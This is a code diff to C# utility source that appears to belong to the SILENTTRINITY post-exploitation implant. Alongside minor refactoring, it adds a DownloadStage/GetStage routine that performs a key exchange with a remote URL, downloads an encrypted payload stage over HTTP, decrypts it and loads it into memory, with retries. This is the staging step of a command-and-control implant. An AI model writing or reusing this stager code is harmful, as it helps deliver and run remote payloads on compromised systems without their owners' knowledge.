@@ -1,4 +1,6 @@
-﻿using System.IO.Compression;
+﻿using System;
+using System.IO;
+using System.IO.Compression;
 
 namespace SILENTTRINITY.Utilities
 {
@@ -6,14 +8,14 @@ namespace SILENTTRINITY.Utilities
     {
         public static string GetDLLName(string name)
         {
-            string DllName = name + ".dll";
+            string dllName = name + ".dll";
 
             if (name.IndexOf(',') > 0)
             {
-                DllName = name.Substring(0, name.IndexOf(',')) + ".dll";
+                dllName = name.Substring(0, name.IndexOf(',')) + ".dll";
             }
 
-            return DllName;
+            return dllName;
         }
 
         public static byte[] GetResourceInZip(ZipStorer zip, string resourceName)
@@ -30,5 +32,21 @@ namespace SILENTTRINITY.Utilities
             return default;
         }
 
+        public static MemoryStream DownloadStage(Uri URL, int sleep = 10, int retries = 5)
+        {
+            return Retry.Do(() => GetStage(URL), TimeSpan.FromSeconds(sleep), retries);
+        }
+
+        static MemoryStream GetStage(Uri uri)
+        {
+            try
+            {
+                var key = Crypto.Base.KeyExchange(uri);
+                var stage = Crypto.Base.Decrypt(key, Http.Get(uri));
+                return new MemoryStream(stage);
+            } catch (Exception ex) {
+                throw ex;
+            }
+        }
     }
 }
